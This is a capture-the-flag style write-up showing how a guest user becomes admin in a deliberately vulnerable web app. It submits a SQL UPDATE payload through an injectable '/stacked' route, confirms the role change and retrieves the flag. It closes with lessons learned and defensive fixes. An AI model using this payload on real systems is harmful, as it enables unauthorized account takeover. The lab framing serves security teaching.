# 🔓 Privilege Escalation via SQL Injection (Role Flip)

## 🎯 Objective

Escalate from a low-privileged user (`guest`) to an admin by abusing a writable SQLi injection point in a web application.

---

## 🧠 Application Context

- **Authentication:** `/auth` accepts credentials and sets cookies:
  - `auth` → username
  - `role` → value from DB (`admin` or `user`)

- **Authorization Checks:**
  - `/admin` and `/moderate` only accessible to users with `role=admin`

- **SQL Injection Point:**
  - `/stacked` route executes arbitrary SQL from user input

---

## 🧪 Exploit Path

### Step 1: Modify Role via SQLi

Navigate to:
/stacked


Submit the payload:
sql
UPDATE users SET role='admin' WHERE username='guest';
✅ This silently updates the guest user's role to admin.


Step 2: Verify the Flip

Submit:

SELECT username, role FROM users;

Expected output:

('admin', 'admin')
('guest', 'admin')  ← Confirmed elevation


Step 3: Login as guest

Go to:
/auth

Submit:

    Username: guest

    Password: guest

    Step 4: Access Protected Routes

Now visit:

    /admin → should reveal the admin-only flag

    /moderate → access second-order injection trigger panel

    FLAG{user_to_admin_sql_flip}

    🧰 Tools & Techniques

    SQLi via stacked queries (;)

    Role-based access control enumeration

    Cookie-based auth forging

    Escalation by manipulating DB state

💡 Lessons Learned

    Even basic SQLi (non-blind) can enable full account takeover

    Role checks must be tied to secure sessions, not user-editable values

    Stacked SQL execution should never be allowed from unsanitized input

✅ Defensive Fix

    Sanitize all inputs (parameterized queries)

    Prevent stacked execution (;) in user input

    Move to token-based or session-backed role tracking

    Log and alert on role changes in backend logic
